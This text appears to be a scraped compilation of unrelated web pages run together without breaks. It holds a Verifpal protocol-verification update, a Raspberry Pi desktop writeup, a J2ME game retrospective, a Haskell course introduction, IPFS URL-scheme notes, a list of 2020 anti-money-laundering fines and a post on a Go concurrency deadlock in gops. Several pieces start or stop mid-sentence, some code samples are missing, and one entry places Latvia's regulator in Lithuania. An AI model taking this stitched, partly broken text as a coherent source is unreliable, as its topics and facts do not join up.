<p><strong><span>Second</span>, Verifpal obtained new features that allow it to capture more of a protocol’s workings.</strong> Verifpal gained the ability to model protocols where users can potentially input <strong>weak or strong passwords</strong>. This is very useful for modeling protocols that include user-provided passwords at points, and is a great way to separate guessable passwords from material that can actually securely be used as an encryption key of some kind.&nbsp;<strong>New primitives</strong> were introduced, allowing the usage of <a href="https://source.symbolic.software/verifpal/verifpal/-/commit/fbc4d7372c0fe7df484d7331f045ff5710a63d37">ring signatures</a>, public key encryption, <a href="https://source.symbolic.software/verifpal/verifpal/-/commit/7467e8abb274778a1b668bed46d5ee67b8574478">Shamir secret sharing</a> and <a href="https://source.symbolic.software/verifpal/verifpal/-/commit/d2261c6b0daddbdccee9ef72e06604ede463d405">blind signatures</a>. The <em>leaks</em> keyword now exists, allowing principals to leak constants to the attacker without necessarily sending them to another principal. <strong><a href="https://source.symbolic.software/verifpal/verifpal/-/commit/221b85db613c6634069f323f84d21c89454db6db">Phases</a></strong> are an exciting new feature that allows Verifpal to reliably model post-compromise security properties such as forward secrecy or future secrecy.&nbsp; <strong><a href="https://source.symbolic.software/verifpal/verifpal/-/commit/780dc774226390eb8183c7ccfa61ed83a9d26e56">Query preconditions</a></strong> allow for illustration relationships between different Verifpal queries on a protocol. And dozens of small improvements and changes were made to Verifpal across its application stack.</p>



<p><strong><span>Finally, and most importantly</span>, Verifpal improved its analysis strength and reliability.</strong> As documented in a previous post, Verifpal’s formal semantics and passive attacker analysis are now <a href="https://blog.symbolic.software/2020/04/14/freshness-unlinkability-model-semantics-verifpal/">fully modeled in the Coq theorem prover</a>. While this does not include active attacker analysis methodology, it does indicate that we can capture Verifpal’s semantics elegantly in existing formalism methods as well as a basic component of its analysis methodology. Our <a href="https://verifpal.com/paper">revised Verifpal paper</a> goes into further detail on the Verifpal active attacker analysis methodology and describes formally how primitives are defined, deconstructed and analyzed in Verifpal. Furthermore, valuable feedback was received from over a dozen Verifpal community members that allowed detecting and fixing analysis errors, misleading analysis results and that pushed us to more concretely define the meaning and function of Verifpal queries such as freshness and authentication. These discussions occurred on the <a href="https://verifpal.com/list">Verifpal Mailing List</a>, the <a href="https://verifpal.com/discord">Verifpal Discord</a> as well as via private feedback.</p>

Given a primitive’s output and a defined subset of its inputs, reveal one of its inputs. (Given ENC(k, m) and k, reveal m).<br>• Recompose. Given a subset of a primitive’s outputs, reveal one of its inputs. (Given a, b, reveal x if a ,b,_ = SHAMIR_SPLIT(x)).<br>• Rewrite. Given a matching defined pattern within a primitive’s inputs, rewrite the primitive expression itself into a logical subset of its inputs. (Given DEC(k, ENC(k, m)), rewrite the entire expression DEC(k, ENC(k, m)) to m).<br>• Rebuild. Given a primitive whose inputs are all the outputs of some same other primitive, rewrite the primitive expression itself into a logical subset of its inputs. (Given SHAMIR_JOIN(a, b) where a, b, c = SHAMIR_SPLIT(x), rewrite the entire expression SHAMIR_JOIN(a, b) to x).</figcaption></figure>



<h2>Understanding Verifpal’s Purpose in the Protocol Security Space</h2>



<p>Given Verifpal’s progress over its first year, it becomes ever more important to clearly answer the question: <em>“Where is Verifpal positioned within the protocol security space in comparison to other tools?”</em> What is Verifpal able to do for me, the protocol analyst, engineer or applied cryptography practitioner?</p>



<p><strong>Verifpal appears to be evolving towards being software best suited for designing, modeling, analyzing and testing cryptographic protocols. </strong>Notably, this means that Verifpal is <em>not</em> likely to progress in the direction where it functions as a producer of <em>protocol security proofs</em>, nor does our experience lead us to believe that this is a space where more contributions are likely to be useful or impactful. This latter functionality will likely remain the jurisdiction of tools such as <a href="https://tamarin-prover.github.io/">Tamarin</a>.</p>



<p><strong>Verifpal’s goal is to focus on the real-world priority of exceeding these tools in terms of how much time and effort it will take for the engineer or practitioner to obtain a meaningful model of their protocol that gives them meaningful analysis answers.</strong> However, the compromises to ease of use and modeling/analysis rapidity required for Verifpal to offer full proving capabilities are deemed too great given Verifpal’s design and functionality goals, and therefore will likely never be adopted fully into its functionality.</p>

<p><strong>In deciding Verifpal’s priorities, we slam the brakes at the moment where the learning curve, effort and analysis cost begin to have strongly diminishing returns for the user.</strong> Our bet is that this path forward for Verifpal will lead to a hugely more substantial impact for engineers and practitioners than traditional automated proof modeling tools. In the example above, we can see how Verifpal makes compromises in analysis completeness that preclude its ability to output full proofs but that greatly increase the likelihood of analysis termination (a significant problem for tools such as <a href="https://prosecco.gforge.inria.fr/personal/bblanche/proverif/">ProVerif</a>) without having an apparently significant impact on the analysis of real-world, non-Ivory-Tower protocols.</p>



<p>Ergo, Verifpal’s main responsibility is to straddle a balance between soundness/reliability  and ease of use/relevance to real-world practitioners. The way we approach this responsibility is by making sure that Verifpal’s semantics are formally specified, that its analysis methodology is amply documented, and that its code is easy to understand. <a href="https://source.symbolic.software/verifpal/verifpal/-/blob/master/internal/libcoq/libcoqtemplate.v">Verifpal’s formal semantics in Coq</a>, the analysis methodology details in the <a href="https://verifpal.com/paper">Verifpal paper</a>  documented and easy-to-understand <a href="https://source.symbolic.software/verifpal">Go codebase</a> aim to fulfill this purpose.</p>



<p>Simultaneously, Verifpal utilizes this formally specified base in order to maintain the development of a language and framework that is idiomatic to the extreme. The Verifpal language is meant to illustrate protocols close to how one may describe them in an informal conversation, while still being precise and expressive enough for formal modeling. Verifpal avoids user error by not allowing users to define their own cryptographic primitives. Instead, it comes with built-in cryptographic functions which nevertheless are defined and which operate according to a formally specified standard with concrete semantics. All of this is coupled with a high standard for documentation, accessibility and support in popular workflows and code editors (via Verifpal for Visual Studio Code and VerifHub).</p>



<p>So far, Verifpal’s chosen path has allowed it to provide value in the <a href="https://blog.symbolic.software/2020/04/05/dp-3t-verifpal/">quick modeling and correct analysis of the DP-3T pandemic contact tracing protocol as it was being specified</a>, and has helped Zoom, Monocypher <a href="https://verifpal.com/getinvolved/">and others</a> achieve quick protocol modeling and prototyping insight as they developed their protocols, by offering a methodology and framework that allowed results to be obtained in hours (sometimes minutes!) instead of weeks. We hope to continue making exciting developments in Verifpal well into 2021, and can’t wait to see how the community makes use of it.</p>

<p>I use a Raspberry Pi 4 as my personal daily driver and it’s pretty great. I know these types of devices tend to be used for smaller pet-projects or fun experiments, but I thought I would share my experience using one as my main computer. Hopefully this can be a solid guide to help others who might be interested in creating a similar setup.</p>

<p>My desktop Pi working away on a regular morning:</p>

<h2 id="my-use-case">My Use Case</h2>

<p>I’m a web designer and developer by trade. Therefore, I require a decent amount of functionality from my computer - more than just simple web browsing and document editing. When I first set out testing if the RPi4 <em>could</em> become my main device, I was surprised at how capable the hardware / software was at running all my required applications. My workload comprises of:</p>

<ul>
  <li>Using Github/Gitlab to pull/push repos, open PRs, etc</li>
  <li>Run SSG (Jekyll mostly) locally for testing</li>
  <li>Run multiple WordPress instances locally</li>
  <li>Edit design files (Photoshop, Illustrator, direct SVGs)</li>
  <li>Simple web chat / email</li>
</ul>

<p>Basic stuff, but I was originally doubtful of the RPi4 to be able to handle it all smoothly. I’m happy to say I was wrong.</p>

<hr id="hardware">

<h2 id="the-hardware">The Hardware</h2>

<p>The following hardware list is what I use specifically for my intended use case. I’m also a sucker for having cool looking SBC builds. By no means is this the “best setup” for everyone - I’m sure other combinations of gear might better suit your own personal needs.</p>

</ul>

<hr id="software">

<h2 id="the-software">The Software</h2>

<p>The 32-bit version of Raspberry Pi OS (‘Debian Buster’ at the time of writing) is my OS of choice. Stable, reliable, and officially supported by the RPi community. It does the job.</p>

<p>The Pi has been overclocked to 2GHz in order to squeeze just a <em>little</em> extra out of the hardware. This has caused zero issues.</p>

<p>I’m also booting directly from the mSATA SSD (via USB booting) instead of relying on a slower microSD card. You can find tons of tutorials online on how to do the same, but I would recommend this one: <a href="https://www.tomshardware.com/how-to/boot-raspberry-pi-4-usb">How to Boot Raspberry Pi 4 From a USB SSD or Flash Drive</a></p>

<p>After that, I simply installed my required apps / configs (where applicable):</p>

<ul>
  <li>Chromium (<em>preinstalled</em>)</li>
  <li>Firefox ESR</li>
  <li>Pale Moon</li>
  <li>Code OSS</li>
  <li>Terminal (<em>preinstalled</em>)</li>
  <li>Libre Office Suite</li>
  <li>Evolution</li>
  <li>Figma (Web - no install needed)</li>
  <li>Apache2 / MySQL</li>
  <li>Blueman (helpful GUI for bluetooth)</li>
</ul>

<h2 id="performance--stats">Performance &amp; Stats</h2>

<p>Using this build day-to-day, I can honestly say I don’t hit any hiccups or lag at all. Multiple applications and WordPress instances are running in the background, while 10-15 tabs are open in the Chromium browser. The little Pi just chugs along without breaking a sweat.</p>

<p>My average CPU temperature sits around 51° (with heatsinks &amp; fan active) while CPU usage never really cranks past 90% during even “intensive” processes.</p>

<p>Since <em>actual</em> data speaks louder than anecdotal chit-chat, I performed a very simple read/write test on my mSATA SSD.</p>

<p>First, clear the cache to avoid conflicting data:</p>

<p>This gives a total read/write value of: <strong>268 MB / 680 MB</strong> per second. Compare that to average microSD card speeds floating around <strong>22 MB / 170MB</strong> per second and you can see (and feel) the massive speed difference. Things are just snappier.</p>

<p><strong>Note</strong>: Obviously extremely high-end (read: expensive) microSD cards <em>might</em> hit read/write speeds similar to that of an SSD. The issue is that you are more likely to corrupt or reach end-of-life with a microSD card - hence why I don’t recommend them.</p>

<p>I love that I can use a fairly cheap Raspberry Pi 4 as my main, personal desktop. Of course, some people might roll their eyes at this build and say, “why not just get a cheaper, more powerful laptop off eBay?”. To that I would respond: <em>you’re missing the point</em>.</p>

<p>It was fun to put together this simple desktop. The fact that it runs fast and stable enough to be my daily driver is a great bonus. If this build interests you at all, I highly recommend giving it a go.</p>

              <div>
                <p>Cyber Ninja was a platformer mobile game, developed in 2004. This was the first mobile game I’ve ever made! </p>



<p>It was a collaboration effort, involving a friend who that acted as producer and game designer. Originally, it was to be called Impalator and sport a medieval/fantasy theme, but this later changed to a high-tech/sci-fi theme. It was supposed to compete with mobile platformers of that time, namely Prince of Persia and Splinter Cell.</p>



<p>The game-play was a combination of pure platforming (jump, run, dodge enemies), puzzle (e.g. “hack” terminals to activate platforms) and combat. The combat phase was very similar to Blizzard’s Black Thorne (a “hide-from-projectiles” mechanic).</p>

</p></figure>



<p>I developed the game in Java for J2ME, with Nokia 3510i as the master version. The technical restrictions were quite crazy, as 3510i had 96×65 pixels resolution, with 64kb of package and 210kb of RAM. Developing the engine and tools, as well as optimizing for this platform took about 3 months of working in the spare time.  As far as I remember, I was using JBuilder for developing the engine and C++Builder for developing the game editor. </p>



<p>Fun fact, I was working 2 jobs at that time, and this one came as a third 🙂</p>



<div><figure><img loading="lazy" width="256" height="565" src="https://www.pirongames.com/wp-content/uploads/2020/01/cn_on_6320_emu.png" alt="" srcset="https://www.pirongames.com/wp-content/uploads/2020/01/cn_on_6320_emu.png 256w, https://www.pirongames.com/wp-content/uploads/2020/01/cn_on_6320_emu-136x300.png 136w" sizes="(max-width: 256px) 100vw, 256px"></figure></div>



<p>Unfortunately, the game ended up with only one level due to the game designer losing interest in the project. As the attempts to find a buyer failed to materialize into something concrete, we decided to abandon the project. </p>



<p>I’ve ended up releasing the source code and tools (and modified graphics) as open-source/GPL, under the name of <a href="https://sourceforge.net/projects/lethalmetal/">Lethal Metal</a>. Sure, in this day when even web games have 10-20Mb and eat up hundred of MB of RAM, this game is rather out of place. However, you may find ideas on how to implement various platformer features (moving platforms, elevators, climbing, etc) in an efficient no-non-sense way.</p>

<h2 id="about-the-course"> About the course</h2>
<p>This is an online course on Functional Programming that uses the Haskell programming language. You can study at your own pace. All the material and exercises are openly available.</p>
<p>This course is aimed at beginners who wish to learn functional programming, but also people who have experience with functional programming and want to learn Haskell in particular. The course assumes no previous knowledge, but knowing at least one programming language beforehand will make the course easier.</p>
<p>Working on the exercises involves knowing how to use the command line, and basic usage of the Git version control system.</p>
<p>This is part 1 of a two-part course. Part 1 covers the basics of Haskell syntax and features. You will learn about recursion, higher-order functions, algebraic data types and some of Haskell’s advanced features. However, part 1 will stick to pure functional programming, without side-effects. I/O and Monads will be introduced in part 2.</p>

<h2 id="haskell"> Haskell</h2>
<p>Haskell is</p>
<p><strong>Functional</strong> – the basic building blocks of programs are functions. Functions can return functions and take functions as arguments. Also, the only looping construct in Haskell is recursion.</p>
<p><strong>Pure</strong> - Haskell functions are pure, that is, they don’t have side effects. Side effects mean things like reading a file, printing out text, or changing global variables. All inputs to a function must be in its arguments, and all outputs from a function in its return value. This sounds restricting, but makes reasoning about programs easier, and allows for more optimizations by the compiler.</p>
<p><strong>Lazy</strong> - values are only evaluated when they are needed. This makes it possible to work with infinite data structures, and also makes pure programs more efficient.</p>
<p><strong>Strongly typed</strong> - every Haskell value and expression has a type. The compiler checks the types at compile-time and guarantees that no type errors can happen at runtime. This means no AttributeErrors (a la Python), ClassCastExceptions (a la Java) or segmentation faults (a la C). The Haskell type system is very powerful and can help you design better programs.</p>
<p><strong>Type inferred</strong> - in addition to checking the types, the compiler can deduce the types for most programs. This makes working with a strongly typed language easier. Indeed, most Haskell functions can be written completely without types. However programmers can still give functions and values type annotations to make finding type errors easier. Type annotations also make reading programs easier.</p>
<p><strong>Garbage-collected</strong> - like most high-level languages these days, Haskell has automatic memory management via garbage collection. This means that the programmer doesn’t need to worry about allocating or freeing memory, the language runtime handles all of it automatically.</p>
<p><strong>Compiled</strong> - even though we mostly use Haskell via the interactive GHCi environment on this course, Haskell is a compiled language. Haskell programs can be compiled to very efficient binaries, and the GHC compiler is very good at optimising functional code into performant machine code.</p>
<p>You’ll learn what these terms mean in practice during this course. Don’t worry if some of them sound abstract right now.</p>
<p>See also: <a href="https://wiki.haskell.org/Functional_programming">The Haskell Wiki page on Functional programming</a>.</p>
<h3 id="features"> Features</h3>
<p>Here’s a showcase of some of the Haskell’s cool features:</p>
<p><strong>Higher-order functions</strong> – functions can take functions as arguments:</p>

<p>This results in <code>[3,6]</code>.</p>
<p><strong>Anonymous functions aka lambdas</strong> – you can define single-use helper functions without giving them a name</p>

<p>This results in <code>["abc","ef"]</code>.</p>
<p><strong>Partial application</strong> – you can define new functions by giving another function only some of the arguments it needs. For example this multiplies all elements in a list by 3:</p>

<p><strong>Algebraic datatypes</strong> – a syntax for defining datatypes that can contain a number of different cases:</p>

<p>Now the type <code>Shape</code> can have values like <code>Point</code>, <code>Rectangle 3 6</code> and <code>Circle 5</code></p>
<p><strong>Pattern matching</strong> – defining functions based on cases that correspond to your data definitions:</p>

<p><strong>Lists</strong> – Unlike many languages, Haskell has a concise built-in syntax for lists. Lists can be built from other lists using <em>list comprehensions</em>. Here’s a snippet that generates names of even length from a set of options for first and last names:</p>

<p>This results in <code>["EvaSmith","EvaOdd","MikeWood"]</code>. Thanks to the laziness of Haskell, we can even create so-called <em>infinite lists</em>:</p>

<p>The first ten prime numbers can be then obtained by evaluating</p>

<p>This evaluates to <code>[2,3,5,7,11,13,17,19,23,29]</code>.</p>
<p><strong>Parameterized types</strong> – you can define types that are parameterized by other types. For example <code>[Int]</code> is a list of <code>Int</code>s and <code>[Bool]</code> is a list of booleans. You can define typed functions that work on all kinds of lists, for example <code>reverse</code> has the type <code>[a] -&gt; [a]</code> which means it takes a list containing any type <code>a</code>, and returns a list of the same type.</p>
<p><strong>Type classes</strong> – another form of polymorphism where you can give a function a different implementation depending on the arguments’ types. For example the <code>Show</code> type class defines the function <code>show</code> that can convert types of various values to strings. The <code>Num</code> type class defines arithmetic operators like <code>+</code> that work on all number types (<code>Int</code>, <code>Double</code>, <code>Complex</code>, …).</p>
<h3 id="some-history"> Some History</h3>
<p>A brief timeline of Haskell:</p>
<ul>
<li>1930s: Lamba Calculus</li>
<li>1950s-1970s: Lisp, Pattern Matching, Scheme, ML</li>
<li>1978 John Backus: <a href="https://www.thocp.net/biographies/papers/backus_turingaward_lecture.pdf">Can programming be liberated from the von Neumann style?</a></li>
<li>1987 A decision was made to unify the field of pure functional languages</li>
<li>1990 Haskell 1.0</li>
<li>1991 Haskell 1.1 (let-syntax, sections)</li>
<li>1992 Haskell 1.2, GHC</li>
<li>1996 Haskell 1.3 (Monads, do-syntax, type system improvements)</li>
<li>1999 Haskell 98</li>
<li>2000’s: GHC development, many extensions to the language</li>
<li>2009 <a href="http://www.haskell.org/onlinereport/haskell2010/">The Haskell 2010 standard</a></li>
<li>2010’s: GHC development, Haskell Platform, Haskell Stack</li>
</ul>
<p>The word ‘haskel’ means wisdom in Hebrew, but the name of the Haskell programming language comes from the logician Haskell Curry. The name Haskell comes from the Old Norse words áss (god) and ketill (helmet).</p>

<h2 id="running-haskell"> Running Haskell</h2>
<p>The easiest way to get Haskell is to install the <code>stack</code> tool, see <a href="http://haskellstack.org/">http://haskellstack.org</a>. The exercises on this course are intended to work with Stack, so you should use it for now.</p>
<p>By the way, if you’re interested in what Stack is, and how it relates to other Haskell tools like Cabal and GHC, <a href="https://www.quora.com/What-is-the-difference-between-Cabal-and-Stack-in-Haskell-projects-Which-one-do-you-recommend-and-why">read more here</a> or <a href="https://docs.haskellstack.org/en/stable/faq/">here</a>. We’ll get back to Haskell packages and using them in detail in part 2 of the course.</p>
<p>For now, after installing Stack, just run <code>stack ghci</code> to get an interactive Haskell environment.</p>
<h2 id="lets-start"> Let’s start!</h2>
<p>GHCi is the interactive Haskell interpreter. Here’s an example session:</p>
<pre><code>$ stack ghci
GHCi, version 8.0.1: http://www.haskell.org/ghc/  :? for help
Prelude&gt; 1+1
2
Prelude&gt; "asdf"
"asdf"
Prelude&gt; reverse "asdf"
"fdsa"
Prelude&gt; :type "asdf"
"asdf" :: [Char]
Prelude&gt; tail "asdf"
"sdf"
Prelude&gt; :type tail "asdf"
tail "asdf" :: [Char]
Prelude&gt; :type tail
tail :: [a] -&gt; [a]
Prelude&gt; :quit
Leaving GHCi.</code></pre>
<p>By the way, the first time you run <code>stack ghci</code> it will download GHC and some libraries, so don’t worry if you see some output and have to wait for a while before getting the <code>Prelude&gt;</code> prompt.</p>
<p>Let’s walk through this. Don’t worry if you don’t understand things yet, this is just a first brush with expressions and types.</p>
<pre><code>Prelude&gt; 1+1
2</code></pre>
<p>The <code>Prelude&gt;</code> is the GHCi prompt. It indicates we can use the functions from the Haskell base library called Prelude. We evaluate 1 plus 1, and the result is 2.</p>
<pre><code>Prelude&gt; "asdf"
"asdf"</code></pre>
<p>Here we evaluate a string literal, and the result is the same string.</p>
<pre><code>Prelude&gt; reverse "asdf"
"fdsa"</code></pre>
<p>Here we compute the reverse of a string by applying the function <code>reverse</code> to the value <code>"asdf"</code>.</p>
<pre><code>Prelude&gt; :type "asdf"
"asdf" :: [Char]</code></pre>
<p>In addition to evaluating expressions we can also ask for their type with the <code>:type</code> (abbreviated <code>:t</code>) GHCi command. The type of <code>"asdf"</code> is a list of characters. Commands that start with <code>:</code> are part of the user interface of GHCi, not part of the Haskell language.</p>
<pre><code>Prelude&gt; tail "asdf"
"sdf"
Prelude&gt; :t tail "asdf"
tail "asdf" :: [Char]</code></pre>
<p>The <code>tail</code> function works on lists and returns all except the first element of the list. Here we see <code>tail</code> applied to <code>"asdf"</code>. We also check the type of the …</p></div></div></div>

It could allow deep linking with a desktop application, such as IPFS Desktop, but this is still unclear.</p><h2 id="alternative-name-system">Alternative name system</h2><p>For alternative name system, this would be quite handy, as it provides a direct access to the URL.
We could imagine <code>ipns://uniswap.eth</code> or even <code>ipns://uniswap.crypto</code> . Both ENS domains and Unstoppable domains could have a handler for these URLs.</p><h2 id="client-side-verification">Client side verification</h2><p>Ultimately, if there are (and I don’t know) <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API">web workers</a> capable of handling these newly safelisted schemes, there would be a way towards client side content verification. And this is major.</p><p>We could imagine a service worker running and verifying the hash of the received content. It would provide a strong guarantee about the content that is being served, without requiring any extensions or local process to be installed.</p><p>This step from Chromium would allow further experimentation in the distributed web.
While having the browser resolve and handle these schemes would make sense, allowing websites to register their ability to handle them should provide a fertile ground for innovation.</p></div></article></section></div></div>]]>

                <p><span>Anti-money laundering (AML) regulations, audits and penalties continue to rise in 2020. Money laundering, terrorist financing, corruption, bribery, and all other financial crimes have many negative consequences, both economically and socially. We are closely witnessing the work that governments and AML regulators are doing to eliminate these negative consequences. All local and international AML regulators, notably FATF, European Union and Wolfsberg Group, aim to guide the fight against financial crime.</span></p><p><span>With the development of technology, access to financial instruments becomes easier. Although this has made our lives easier, it has created various opportunities for criminals. Gaps in emerging industries such as the crypto industry create major financial crime risks. </span></p><p><span>When we look at the total AML penalties in recent years, we observe an increase in the total penalty amount. Failures in the compliance processes of financial institutions cause them to face heavy fines. While the AML penalties given in 2018 were approximately $ 4 billion, the AML penalties given in 2019 increased by approximately 2 times to approximately $ 8 billion. When we examine some of the data announced in 2020, we see that the AML penalties given in the first half of 2020 are close to 6 billion dollars. Some of the reasons for the AML fines are due to deficiencies in the "Know Your Customer", "Customer Due Diligence" and "Monitoring Suspicious Transactions" procedures.</span></p><p><span>In this article, we will share with you the AML penalties issued by the regulators in 2020. If you have any news you want to add, feel free to contact us. </span></p><p><span><i>(Will be updated)</i></span></p><h2><b>Sri Lanka Fines 2 Banks, 3 Finance Firms for AML Failures</b></h2><p><span>Sri Lanka’s Financial Intelligence Unit fined two banks and three finance companies for violating anti-money laundering obligations. According to the FIU's statements, the reasons for the penalties include violations of Policy Exposed Persons (PEPs) and sanction screening and implementation of customer due diligence procedures.</span></p><p><span><i>(July 2020)</i></span></p><h2><b>FCMC fines Signet Bank for breaching AML rules</b></h2><p><span>The Financial and Capital Market Commission is a public body that oversees financial institutions in Lithuania. FCMC fined Signet Bank of Latvia 906,610 Euro for violating anti-money laundering and anti-terrorism financing (AML) regulatory requirements. The reasons for the fines include the Bank's inadequate internal control system, customer-based risks and violations and deficiencies regarding risk management.</span></p><p><span><i>(July 2020)</i></span><b><br></b></p><h2><b>New York Regulator Fines Deutsche Bank for AML Failures</b></h2><p><span>The New York State Department of Financial Services (DFS) imposed penalties on Deutsche Bank AG, the New York branch and Deutsche Bank Trust Company America for AML compliance failures as well as correspondent banking relationships with Danske Bank Estonia and FBME Bank. Deutsche Bank faced a penalty of $ 216.1 million as a result of this decision.</span></p><p><span><i>(July 2020)</i></span></p><h2><b>Swedish SEB Bank Fined for Poor Anti-Money-Laundering Measures</b></h2><p><span>The Swedish Financial Supervisory Authority (FSA) fined SEK 1 billion (US $ 107 million) for failing to provide adequate anti-money laundering (AML) measures at its subsidiaries in the Baltic countries of Sweden's SEB bank. The Swedish Financial Inspection started to examine the SEB in 2015 in coordination with officials in Estonia, Latvia and Lithuania. The investigation was completed in 2019 and showed that "SEB's subsidiaries in the Baltic are exposed to a high risk of money laundering".</span></p><p><span><i>(June 2020)</i></span></p><h2><b>FCA fines Commerzbank London £ 37.8 million for AML violations</b></h2><p><span>The UK's financial regulator, the Financial Conduct Authority (FCA), fined the Commerzbank London branch £ 37.8 million for violations of AML controls. The FCA said in a statement that the violations stemming from Commerzbank pose great financial crime risks and damage the stability and integrity of the financial system in the UK. </span></p><p><span> As a result of FCA's audits, Commerzbank London detects three major failures, including the failure of periodic due diligence on its customers. According to FCA's audit report, the bank was also found to be insufficient in the control procedures of money laundering risks in customer transactions. Also, FCA found that the bank did not have adequate risk management systems. </span></p><p><span><i>(June 2020)</i><br></span>  <b><br></b></p><h2><b>HK regulator imposes $25.2m fine on Guotai Junan Securities</b></h2><p><span>Hong Kong's Securities and Futures Commission (SFC) imposed a $ 25.2 million fine on Guotai Junan Securities (Hong Kong) Limited for violations of anti-money laundering processes. The reasons for the AML penalty include the failure to regularly monitor customer transactions and delays in reporting processes.</span></p><p><span><i>(June 2020)</i></span></p><h2><b>BNP Paribas Chinese Unit Fined for Anti-Money Laundering Violations</b></h2><h2><b> </b></h2><p>     <span>The Chinese unit of European banking giant BNP Paribas has been fined 2.7 million yuan ($378.200) for failing to properly verify customer identification and report significant and suspicious transactions by the Chinese central bank. AML penalties in China are not limited to this. The Chinese Central Bank recently fined China Minsheng Banking Corp. 23.6 million yuan and China Everbright Bank 18.2 million yuan for failing to ensure AML compliance. And, Brokerage Huatai Securities Co. Ltd. has been fined 10.1 million yuan for similar AML violations. </span></p><p><span><i>   (May 2020)</i></span></p><h2><b>Kenya fines 5 banks $ 3.75 million for anti-money laundering violations</b></h2><h2><b> </b></h2><p>     <span>KCB Group KCB.NR, Equity EQTY.NR, Co-op Bank Kenya COOP.NR, StanChart Kenya SCBK.NR and Diamond Trust DTK.NR are 5 banks that faced AML fines. Five commercial banks operating in Kenya were fined $ 3.75 million due to disruptions in AML compliance processes. In addition, 5 banks were fined $ 4 million in Kenya in 2018 for not reporting suspicious transactions. </span></p><p><span><i>   (March 2020)</i></span><span><i><br></i></span><span><br></span></p><h2><b>Online casino fined £3 million for "systemic" AML failings</b></h2><p><span>The Gambling Commission fined Mr. Green £ 3 million for AML violations. As a result of the audit, the Gambling Commission found that Mr. Green had not made a proper risk assessment. Failing to implement the Know your customer and customer due diligence procedures, Mr. Green became the ninth gambling business to face an AML penalty. With this penalty, it was once again revealed how important AML regulations are in the casino industry. </span></p><p><span><i>(February 2020)</i></span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Even in Go, concurrency is still not easy (with an example)</h2>

	<p><small>September  1, 2020</small></p>
</div><div><p>Go is famous for making concurrency easy, through good language
support for <a href="https://golangbot.com/goroutines/">goroutines</a>. Except
what Go makes easy is only one level of concurrency, the nuts and
bolts level of making your code do things concurrently and communicating
back and forth through channels. Making it do the right things
concurrently is still up to you, and unfortunately Go doesn't
currently provide a lot of standard library support for correctly
implemented standard concurrency patterns.</p>

<p>For example, one common need is for a limited amount of concurrency;
you want to do several things at once, but only so many of them.
At the moment this is up to you to implement on top of goroutines,
channels, and things like the <a href="https://golang.org/pkg/sync/"><code>sync</code></a>
package. This is not as easy as it looks, and quite competent people
can make mistakes here. As it happens, I have an example ready to
hand today.</p>

<p><a href="https://github.com/google/gops">Gops</a> is a convenient command to
list (and diagnose) Go processes that are currently running on your
system. Among other things, it'll tell you which version of Go they
were compiled with, which is handy if you want to see if you have out
of date binaries that should be rebuilt and redeployed. One of the
things <code>gops</code> needs to do is look at all of the Go processes on your
system, which it does concurrently. However, it doesn't want to look
at too many processes at once, because <a href="https://github.com/google/gops/pull/118">that can cause problems with
file descriptor limits</a>. This
is a classic case of <em>limited concurrency</em>.</p>

<p>Gops implements this at the moment with code in <a href="https://github.com/google/gops/blob/6fb0d860e5fa50629405d9e77e255cd32795967e/goprocess/gp.go#L29">goprocess.FindAll()</a>
that looks like this, in somewhat sketched and reduced form:</p>

<blockquote><pre>func FindAll() []P {
   pss, err := ps.Processes()
   [...]
   found := make(chan P)
   limitCh := make(chan struct{}, concurrencyProcesses)

   for _, pr := range pss {
      limitCh &lt;- struct{}{}
      pr := pr
      go func() {
         defer func() { &lt;-limitCh }()
         [... get a P with some error checking ...]
         found &lt;- P
      }()
   }
   [...]

   var results []P
   for p := range found {
      results = append(results, p)
   }
   return results
}
</pre>
</blockquote>

<p>(In the real code there's a WaitGroup for coordination, and the
<code>found</code> channel gets closed appropriately.)</p>

<p>How this works is clear, and is a standard pattern (covered in eg
Go 101's <a href="https://go101.org/article/channel-use-cases.html">Channel Use Cases</a>). We use a
buffered channel to provide a limited number of tokens; sending a
value into the channel implicitly takes a token (and blocks if the
token supply is exhausted), while receiving a value from it puts a
token back in. We take a token before we start a new goroutine, and
the goroutine releases the token when it's done.</p>

<p>Except that <a href="https://github.com/google/gops/issues/123">this code has a bug if there are too many processes
to examine</a>. Even knowing
that there is a bug in this code, it may not be obvious.</p>

<p>The bug is that the goroutines only receive from <code>limitCh</code> to release
their token after sending their result to the unbuffered <code>found</code>
channel, while the main code only starts receiving from <code>found</code>
after running through the entire loop, and <strong>the main code takes
the token in the loop and blocks if no tokens are available</strong>. So
if you have too many processes to go through, you start N goroutines,
they all block trying to write to <code>found</code> and don't receive from
<code>limitCh</code>, and the main <code>for</code> loop blocks trying to send to <code>limitCh</code>
and never reaches the point where it starts receiving from <code>found</code>.</p>

<p>At one level, this bug is a very fragile bug; it only exists because
of multiple circumstances. If the goroutines took the token by
sending to <code>limitCh</code> instead of the main <code>for</code> loop doing it, the
bug would not exist; the main <code>for</code> loop would start them all, many
would stop, and then it would go on to receive from <code>found</code> so that
they could receive from <code>limitCh</code> and release their token so other
goroutines would run. If the goroutines received from <code>limitCh</code> to
release their token before sending to <code>found</code>, it wouldn't exist
(but because of error handling, it's simpler and more reliable to
do the receive in a <code>defer</code>). And if the entire <code>for</code> loop was in
an additional goroutine, the main code would go on to receive from
<code>found</code> and unblock completed goroutines to release their tokens,
so the fact that the <code>for</code> loop was blocked waiting to send to
<code>limitCh</code> wouldn't matter.</p>

<p>At another level, this shows how concurrency is not easy as easy
as it looks in Go. All you need is one mistake and things skid to
a halt, and all of the code involved can look good to a casual
examination. Getting concurrency correct is simply hard for people
(we can debate about why, but I think that it is is very clear).</p>

<p>(I'm sure that the people who wrote and approved the change that
added this concurrency limiting code to gops were good programmers.
A tricky case still tripped them up, passing all of their scrutiny.
Even when I knew that there was a concurrency problem in the code
and where it was (because my <code>gops</code> was hanging all of a sudden,
and <a href="https://github.com/go-delve/delve">Delve</a> told me where
everything was stuck), it still took me some time to see what the
exact problem was.)</p>

<h3>Requirements</h3>
<p>To build your own you'll need</p>
<ul>
<li><a href="https://www.raspberrypi.org/">Raspberry Pi</a> (model Zero W works pretty good)</li>
<li><a href="https://www.raspberrypi.org/products/raspberry-pi-high-quality-camera/">Raspberry Pi Camera Module</a></li>
<li>16GB SD Card or bigger</li>
<li>(optionally Wi-Fi connectivity for easy access)</li>
</ul>
<p>There is even an official <a href="https://www.raspberrypi.org/products/raspberry-pi-high-quality-camera/">High Quality Camera</a>, that will give even better quality time-lapses!</p>

</ul></li>
